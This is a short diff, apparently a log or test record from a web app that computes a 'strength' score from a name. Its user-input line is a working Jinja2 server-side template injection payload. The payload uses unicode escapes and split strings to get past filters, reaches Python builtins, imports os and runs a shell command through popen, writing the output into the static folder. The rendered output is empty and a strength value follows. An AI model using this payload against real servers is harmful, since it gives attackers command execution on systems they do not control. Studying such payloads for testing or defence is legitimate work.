@@ -1,0 +1,4 @@
+User Input: {% set a = self|attr('\u005f\u005finit\u005f\u005f')    |attr('\u005f\u005fglobals\u005f\u005f')    |attr('get')('\u005f\u005fbuiltins\u005f\u005f') %} {% set i = a|attr('get')('\u005f\u005fimport\u005f\u005f')('o'+'s') %} {% set p = i|attr('p\u006fp\u0065n')('ls > static/out\u002etxt') %} {% set r = p|attr('read')() %} {% print r %}
+Rendered Output:     
+Final Name Variable: Name :     
+Strength Calculation: Strength : 26093
